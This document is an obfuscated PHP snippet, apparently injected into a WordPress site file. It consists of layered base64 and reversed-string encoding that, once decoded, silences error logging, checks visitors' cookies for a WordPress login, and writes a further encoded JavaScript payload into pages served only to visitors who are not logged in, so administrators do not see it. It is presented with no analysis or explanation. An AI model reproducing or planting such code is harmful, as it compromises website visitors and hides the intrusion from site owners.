UTmxRek5sVWpObE16TmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME1sa2pNbEFqTmxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNek5sUWtNbE1rTmxFak5sTWpObFlrTmxNa05sUWtNbFEwTmxrek5sVWpObElrTmxJME5sUWpNbEFqTmxnak1sUWtObFVqTmxRek5sa0RObFF6TmxVak5sY2pObFVrTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sTWtObEVqTmxNak5sWWtObE1rTmxBak1sVTBNbFEwTWxBak1sa2pNbGt6TmxVak5sSWtObGdqTWxBak1sUTBNbEFqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sVWpObFFrTmxrak5sUVRObFF6TmxVak5sY2pObEFqTWxRek5sTXpObFVrTmxZa05sTWpObEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEVFTWxRRU1sSTBNbGtqTWxFek1sQWpNbE1rTWxBak5sVWpObGNqTmxFak5sSXpObFlrTmxRek5sTXpObFFrTWxNa05sRWpObE1qTmxZa05sTWtObFFrTWxRME5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sSTBObFFqTWxBak5sZ2pNbFFrTmxVak5sUXpObGtETmxRek5sVWpObE16TmxVa01sVWpObGNqTmxFak5sSXpObFlrTmxRek5sTVRObE1rTmxFak5sTWpObFlrTmxNa05sQWpNbFUwTWxRME1sQWpNbGtqTWxRek5sVWpObGNqTmxJek5sRWpObFF6Tmxnak1sQWpNbFEwTWxBak1sUWpObFVqTmxRek5sa2pObE16Tmxrak5sWVRObE16TmxFRE5sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxRek5sVWpObE16TmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbFFVTmxrak1sZ2pObFF6Tmxjak5sVWtObFVqTmxNa05sVWtNbFFqTmxVak5sUXpObGtqTmxNek5sa2pObFlUTmxVa05sWWtObFVrTmxBak1sRWtNbEFqTWxrak1sZ2pNbFFrTmxZa05sUWpObFVrTmxFak5sSXpObFVrTWxnak5sUXpObEVqTmxRRU5sZ2pNbEl6TmxZa05sWWtObE1rTmxZak5sVWtNbGdqTmxRek5sRWpObFFFTmxJVU5sUWpObFVqTmxRek5sa2pObE16Tmxrak5sWVRObFVrTmxZa05sVWtObEFqTWxVa05sSXpObFV6TmxRek5sVWpObEl6TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sa2pNbEF6TWxBak1sUTBNbFEwTWxBak1sa2pNbEFqTmxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNek5sUWtNbE1rTmxFak5sTWpObFlrTmxNa05sUWtNbFEwTmxRek5sVWpObGNqTmxJek5sRWpObFF6TmxJME5sUWpNbEFqTmxnak1sUWtObFVqTmxRek5sa0RObFF6TmxVak5sY2pObFVrTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sTWtObEVqTmxNak5sWWtObE1rTmxBak1sVTBNbFEwTWxBak1sa2pNbGd6TmxVak5sUWpObFVrTmxrak5sQWpNbE1rTWxRek5sVWpObGNqTmxJek5sRWpObFF6Tmxnak1sZ2pNbEl6TmxVak5sUXpObE1rTmxrak5sWWpObFVrTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sQWpNbFEwTWxBak1sUWpObFVqTmxRek5sa2pObE16Tmxrak5sWVRObFVrTmxZa05sVWtObEFqTWxRek5sTXpObFVrTmxZa05sTWpObEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME5sQWpNbFUwTWxRME1sQWpNbGtqTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbEFqTWxRME1sQWpNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxRa05sWWtObEl6TmxZRE5sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxRa05sWWtObFFqTmxVa05sRWpObElUTmxRek5sVWpObGNqTmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxRME5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBNbGtqTWxRME5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbFEwTmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxrak1sQXpNbEFqTWxNa01sQWpObFVqTmxjak5sRWpObEl6TmxZa05sUXpObE16TmxRa01sTWtObEVqTmxNak5sWWtObE1rTmxRa01sUTBObFF6TmxVak5sY2pObEl6TmxFak5sUXpObEkwTmxRak1sQWpObGdqTWxRa05sVWpObFF6TmxrRE5sUXpObFVqTmxNek5sVWtNbFVqTmxjak5sRWpObEl6TmxZa05sUXpObE1UTmxNa05sRWpObE1qTmxZa05sTWtObGtETWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTmxrak1sa2pNbEFqTmxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNek5sUWtNbE1rTmxFak5sTWpObFlrTmxNa05sUWtNbFEwTmxRek5sVWpObGNqTmxJek5sRWpObFF6TmxJME5sUWpNbEFqTmxnak1sUWtObFVqTmxRek5sa0RObFF6TmxVak5sY2pObFVrTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sTWtObEVqTmxNak5sWWtObE1rTmxFak1sZ2pNbFlqTmxrak5sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxJME5sQWpNbFUwTWxRME1sQWpNbGtqTWxnek5sVWpObFFqTmxVa05sa2pObEFqTWxNa01sUXpObFVqTmxjak5sSXpObEVqTmxRek5sZ2pNbGdqTWxnak5sTWpObEVqTmxVRE5sSXpObFlrTmxZak5sVWtNbE16TmxRek5sVWpObGNqTmxJek5sRWpObFF6TmxBak1sQWpNbEFqTWxBak1sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBObEFqTWxVME1sUTBNbEFqTWxrak1sTXpObFF6TmxVak5sY2pObEl6TmxFak5sUXpObGdqTWxBak1sUTBNbEFqTWxVak5sY2pObEVqTmxJek5sWWtObFF6TmxNVE5sWWtObFFUTmxNek5sVWtObFlrTmxrak5sUXpObEVqTmxNak5sWWtObE1FTmxRek5sVWpObGNqTmxJek5sRWpObFFUTmxVak5sWXpObEVqTmxNek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sRUVNbFFFTWxFRU1sUUVNbEkwTWxJek1sQWpNbFEwTWxBak1sTXpObEl6TmxVek5sWWtObGdETmxRak5sVWpObGN6TmxZa05sTWtObE1rTmxFak5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sQWpNbElrTmxNak5sa2pObE1rTmxNak5sUWtNbFVqTmxJek5sQWpNbGN6TmxZa05sTWtObE1rTmxFak5sQWpNbFlrTmxRek5sQWpNbE16TmxJek5sVXpObFlrTmxnak5sQWpNbFlqTmxZa05sQWpNbEl6TmxVak5sSWpObFFrTmxVek5sVUVObEFqTWxZa01sWWtNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbEkwTWxFek1sQWpNbFEwTWxBak1sTXpObFVqTmxRek5sVXpObFVrTmxrak5sUUVObFF6TmxNek5sVWpObEl6TmxBak1sUXpObE16TmxVa05sWWtObE1qTmxBak1sQWpNbEFqTWxBak1sRUVNbFFFTWxNek5sSWtObE1qTmxrak5sTWtObE1qTmxBak1sVWtObFVqTmxVak5sY3pObFF6TmxVak5sSWpObEFqTWxNek5sVWpObFFrTmxrak5sUVRObEFqTWxZa01sWWtNbEFqTWxBak1sQWpNbEFqTWxFRU1sUUVNbFFVTmxjak1sWXpNbE1qTmxrek1sZ0RObEl6TmxVa05sWWtNbE16TmxRa05sVWpObFF6TmxNek5sa3pObE16TmxVa01sTXpObFFrTWxrek5sTXpObFlrTWxZa01sRTBNbE16TmxBek5sUXpObFF6Tmxnak5sY2pNbEFqTWxNa01sY2pNbFV6TWxNak5sZ3pNbElFTmxFek5sWWpObFlrTWxNek5sUWtObFVqTmxRek5sTXpObGt6TmxNek5sVWtNbE16TmxRa01sa3pObE16TmxZa01sWWtNbEUwTWxNek5sQXpObFF6TmxRek5sZ2pObGNqTWxBak1sTWtNbGNqTWxBek1sTWpObGN6TWxVVE5sa1RObFFUTmxZa01sTXpObFFrTmxVak5sUXpObE16Tmxrek5sTXpObFVrTWxNek5sUWtNbGt6TmxNek5sWWtNbFlrTWxFME1sTXpObEF6TmxRek5sUXpObGdqTmxjak1sQWpNbE1rTWxjak1sa3pNbE1qTmxZek1sSVRObE1FTmxjRE5sWWtNbE16TmxRa05sVWpObFF6TmxNek5sa3pObE16TmxVa01sTXpObFFrTWxrek5sTXpObFlrTWxZa01sRTBNbE16TmxBek5sUXpObFF6Tmxnak5sY2pNbEFqTWxNa01sY2pNbGN6TWxNak5sVXpNbFFFTmxVak5sZ0RObFlrTWxNek5sUWtObFVqTmxRek5sTXpObGt6TmxNek5sVWtNbE16TmxRa01sa3pObE16TmxZa01sWWtNbEUwTWxNek5sQXpObFF6TmxRek5sZ2pObGNqTWxBak1sTWtNbGNqTWxNek1sTWpObFF6TWxFek5sRURObFVrTmxZa01sTXpObFFrTmxVak5sUXpObE16Tmxrek5sTXpObFVrTWxNek5sUWtNbGt6TmxNek5sWWtNbFlrTWxFME1sTXpObEF6TmxRek5sUXpObGdqTmxjak1sQWpNbE1rTWxjak1sWXpNbE1qTmxNek1sUWtObGNqTmxJek5sWWtNbE16TmxRa05sVWpObFF6TmxNek5sa3pObE16TmxVa01sTXpObFFrTWxrek5sTXpObFlrTWxZa01sRTBNbE16TmxBek5sUXpObFF6Tmxnak5sY2pNbEFqTWxNa01sY2pNbGN6TWxNak5sSXpNbEl6TmxJRE5sSVRObFlrTWxNek5sUWtObFVqTmxRek5sTXpObGt6TmxNek5sVWtNbE16TmxRa01sa3pObE16TmxZa01sWWtNbEUwTWxNek5sQXpObFF6TmxRek5sZ2pObGNqTWxBak1sTWtNbGNqTWxNek1sTWpObEV6TWxnRE5sZ3pObFFETmxZa01sTXpObFFrTmxVak5sUXpObE16Tmxrek5sTXpObFVrTWxNek5sUWtNbGt6TmxNek5sWWtNbFlrTWxFME1sTXpObEF6TmxRek5sUXpObGdqTmxjak1sQWpNbE1rTWxjak1sa3pNbE1qTmxBek1sRTBObFVFTmxrak5sWWtNbE16TmxRa05sVWpObFF6TmxNek5sa3pObE16TmxVa01sTXpObFFrTWxrek5sTXpObFlrTWxZa01sRTBNbE16TmxBek5sUXpObFF6Tmxnak5sY2pNbElVTmxBak1sUTBNbEFqTWxNek5sUXpObFVqTmxjak5sSXpObEVqTmxRek5sQWpNbFF6TmxNek5sVWtObFlrTmxNak5sQWpNbEFqTWxBak1sQWpNbEVFTWxRRU1sSTBObEFqTWxrak1sTXpObEl6TmxVak5sUXpObFVqTmxRa05sRWpObEl6TmxFak5sQXpObGdqTWxBak1sVWtObFlrTmxrak5sUXpObE1qTmxVa05sVXpObFlqTmxnak1sVTBNbFF6TmxBek5sa2pObEl6TmxNak5sTXpObE0wTWxJQ0tsQlhZak5YWnVWSEtsUlhheWRuTDA1V1p0VjNZdlJtUGlRSGNwSjNZekZtZGhwMkwwaFhaMEpTUGxCWGUwQkNkd2xtY2pOSFAiKGJvdGEoZXRpcncudG5lbXVjb2Q+InRwaXJjc2F2YWovdHhldCI9ZXB5dCB0cGlyY3M8JyBvaGNlIHspMCA9PSA4SU85R2MkKGZpIH0gfSA7a2FlcmIgOzEgPSA4SU85R2MkIHspKSduaV9kZWdnb2xfc3NlcnBkcm93JyAsKU9vT092SG5ValV2JChsYXZydHMocnRzcnRzKCBmaSB7KU9vT092SG5ValV2dnYkID49IE9vT092SG5ValV2JCBzYSBFSUtPT0NfJChoY2Flcm9mIDswID0gOElPOUdjJCA7KTAgLCdzcm9ycmVfeWFscHNpZCcodGVzX2luaUAgOykwICwnc3JvcnJlX2dvbCcodGVzX2luaUAgOylMTFVOICwnZ29sX3JvcnJlJyh0ZXNfaW5pQCA7KTAoZ25pdHJvcGVyX3JvcnJlIA=='))); $vxqjk(); ?>